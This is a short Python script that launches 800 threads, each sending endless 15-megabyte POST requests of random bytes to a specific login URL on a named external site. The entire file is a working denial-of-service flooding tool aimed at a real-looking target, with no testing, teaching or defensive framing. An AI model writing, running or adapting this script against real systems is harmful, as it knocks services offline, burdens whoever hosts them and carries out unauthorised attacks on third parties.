import requests, os, json, random, threading, time

url ="https://ms.facethepeople.net/login"

size_in_bytes = 1024 * 1024 * 15
data = str(os.urandom(size_in_bytes))

def req():
	
	while True:
		try:
			resp = requests.post(url,data=data)
			print(resp)
		except Exception as e:
			print(e)
			time.sleep(5)




def r():
    total_threads = 800
    threads = []

    for i in range(total_threads):
        t = threading.Thread(target=req)
        threads.append(t)
        t.start()

    # Wait for all threads to finish
    for t in threads:
        t.join()

    print("All threads completed!")


r()
